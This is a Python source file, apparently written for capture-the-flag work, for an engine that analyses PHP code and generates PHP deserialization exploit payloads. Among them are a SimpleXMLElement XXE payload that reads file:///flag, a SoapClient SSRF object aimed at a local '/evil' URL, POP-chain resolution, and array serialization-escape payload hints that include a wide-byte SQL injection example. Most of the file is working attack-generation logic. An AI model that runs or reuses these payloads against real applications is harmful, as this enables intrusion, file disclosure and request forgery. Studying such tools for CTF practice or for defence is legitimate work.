import re
from .model.class_info import ClassInfo, FeatureSet
from .parser.php_parser import PhpParserV2
from .detector.feature_extractor import FeatureExtractorV2
from .strategy.registry import get_strategy
from .chain.pop_resolver import PopChainResolver
import core_v2.strategy.standard  # 确保策略被注册

class Sd0pEngineV2:
    def __init__(self):
        self.parser = PhpParserV2()
        self.extractor = FeatureExtractorV2()

    def analyze_and_generate(self, php_code: str) -> str:
        # 1. 解析
        classes = self.parser.parse(php_code)
        if not classes:
            # P0 任务 2：处理无用户自定义类的情况
            return self._generate_native_class_payload(php_code)

        target_class = classes[0] # 简化：取第一个类作为入口
        
        # 建立全局类映射，供策略层查找跨类引用
        target_class._all_classes_map = {c.name: c for c in classes}
        
        # 2. 特征提取
        # 注意：对于字符串逃逸等全局逻辑，需要传入完整代码
        features = self.extractor.extract_from_code(target_class, php_code)
        print(f"[V2 Engine] Extracted features for {target_class.name}: has_wakeup={features.has_wakeup}, has_destruct={features.has_destruct}")
        
        # 3. 递归处理 POP 链
        if features.pop_chain_conditions:
            resolver = PopChainResolver(target_class._all_classes_map)
            chain_structure = resolver.resolve_chain(target_class.name, features)
            if chain_structure:
                # 将解析出的完整链结构传递给策略层
                target_class._pop_chain_structure = chain_structure
        
        # 4. 简化：直接使用 standard 策略，不实现 Lua 分类器
        tags = ["standard"]
        print(f"[V2 Engine] Detected tags: {tags}")
        
        # V3-0: 高级策略路由（特性开关）
        V3_FEATURE_FLAG = True
        if V3_FEATURE_FLAG:
            # 导入 advanced 模块以注册策略
            from .strategy import advanced
            from .strategy.registry import get_advanced_strategy
            advanced_strategy = get_advanced_strategy(features)
            if advanced_strategy:
                print(f"[V3 Engine] Using advanced strategy: {advanced_strategy.__class__.__name__}")
                return advanced_strategy.generate(classes, features)
        
        # 5. 策略选择与生成
        strategy = get_strategy("standard")
        
        if strategy:
            return strategy.generate(target_class, features, tags)
        else:
            return f"Strategy for tag 'standard' not implemented yet."

    def _generate_native_class_payload(self, php_code: str) -> str:
        """针对无自定义类场景，根据上下文生成内置类 Payload 或数组逃逸 Payload"""
        import re

        # P0: 检测数组序列化逃逸场景
        escape_info = self._detect_array_escape(php_code)
        if escape_info:
            return self._generate_array_escape_payload(escape_info, php_code)

        # 检测常见的触发模式
        if re.search(r'\becho\b', php_code):
            # echo 触发 __toString -> SimpleXMLElement XXE
            from .strategy.exploits import generate_xxe_payload
            return generate_xxe_payload()
        elif re.search(r'\bfile_get_contents\b|\bfopen\b', php_code):
            # 文件读取 -> SoapClient SSRF (如果存在调用链)
            return "O:10:\"SoapClient\":5:{s:3:\"uri\";s:4:\"test\";s:8:\"location\";s:29:\"http://127.0.0.1:8080/evil\";}"
        else:
            # 默认返回一个通用的 SimpleXMLElement 探测 Payload
            # 注意：s:N 的 N 必须等于字符串内容的字节长度，否则 PHP unserialize 会失败
            xxe_payload = '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag"> ]><x>&xxe;</x>'
            return f'O:16:"SimpleXMLElement":1:{{s:4:"data";s:{len(xxe_payload.encode("utf-8"))}:"{xxe_payload}";}}'
    
    def _detect_array_escape(self, php_code: str) -> dict:
        """检测数组序列化逃逸场景"""
        from .utils.escape_detector import ExternalEscapeDetector
        
        # 检测字符串替换
        escapes = ExternalEscapeDetector.detect(php_code)
        if not escapes:
            return None
        
        # 检测是否操作数组（serialize 作用于数组变量）
        array_pattern = r'serialize\s*\(\s*\[.*?\]|serialize\s*\(\s*array\s*\('
        if not re.search(array_pattern, php_code, re.DOTALL):
            return None
        
        # 提取目标键名和值
        target_match = re.search(r"\['([^']+)'\]\s*===\s*(true|false|'[^']+'|\d+)", php_code)
        if not target_match:
            return None
        
        return {
            'escapes': escapes,
            'target_key': target_match.group(1),
            'target_value': target_match.group(2),
            'has_delta_zero': any(e.get('delta') == 0 for e in escapes)
        }
    
    def _generate_array_escape_payload(self, escape_info: dict, php_code: str) -> str:
        """生成数组逃逸 Payload"""
        target_key = escape_info['target_key']
        target_value = escape_info['target_value']
        has_delta_zero = escape_info['has_delta_zero']
        
        # 处理 delta == 0 的情况（长度不变）
        if has_delta_zero:
            return (
                f"⚠️  检测到数组字符串逃逸场景，但替换前后长度相同（delta=0）。\n"
                f"\n"
                f"目标: 将 '{target_key}' 注入为 {target_value}\n"
                f"\n"
                f"建议:\n"
                f"1. 检查是否存在宽字节注入点（如 addslashes + GBK）\n"
                f"2. 手动构造 Payload，利用多字节字符截断\n"
                f"3. 示例: username=admin%bf' UNION SELECT...\n"
                f"\n"
                f"当前无法自动生成，需要人工分析。"
            )
        
        # 处理 delta != 0 的情况（长度变化）
        # 这里简化实现，实际需要根据 delta 计算填充
        for escape in escape_info['escapes']:
            if escape.get('delta', 0) != 0:
                delta = escape['delta']
                search = escape['search']
                replace = escape['replace']
                
                # 构造基本的逃逸 Payload
                # 这里需要根据具体的 delta 和目标值来计算
                # 由于情况复杂，先返回提示信息
                return (
                    f"✅ 检测到数组字符串逃逸场景（delta={delta}）\n"
                    f"\n"
                    f"过滤: str_replace('{search}', '{replace}', ...)\n"
                    f"目标: 将 '{target_key}' 注入为 {target_value}\n"
                    f"\n"
                    f"Payload 构造思路:\n"
                    f"1. 计算需要填充的字符数: abs(delta) * N\n"
                    f"2. 构造注入片段，使过滤后产生额外的序列化字段\n"
                    f"3. 例如: username=admin{'X' * abs(delta)};s:{len(target_key)}:\"{target_key}\";b:1;}}\n"
                    f"\n"
                    f"注意: 具体 Payload 需根据 delta 和目标值手动计算。"
                )
        
        return "未能识别有效的逃逸场景"

    def _resolve_pop_chain(self, all_classes, entry_class, entry_features):
        """递归解析 POP 链并合并属性"""
        class_map = {c.name: c for c in all_classes}
        
        for cond in entry_features.pop_chain_conditions:
            target_name = cond['target_class']
            source_prop = cond['source_property']
            
            if target_name in class_map:
                target_cls = class_map[target_name]
                target_features = self.extractor.extract(target_cls)
                
                # 将目标类的属性值合并到入口类的特征中
                # 这里简化处理：如果目标类构造函数中有赋值逻辑，尝试提取默认值
                # 在实际复杂场景中，需要更深的污点追踪
                if '__construct' in target_cls.methods:
                    body = target_cls.methods['__construct'].body
                    # 简单提取 $this->xxx = 'yyy'
                    assign_pattern = r'\$this->(\w+)\s*=\s*[\'"]([^\'"]+)[\'"]'
                    for m in re.finditer(assign_pattern, body):
                        prop_name = m.group(1)
                        prop_value = m.group(2)
                        # 将这些属性关联到入口类的 source_prop 对应的对象上
                        # 简化：目前直接将这些属性视为入口类需要的上下文信息
                        # 真正的 Payload 生成时，我们需要序列化整个链
                        pass
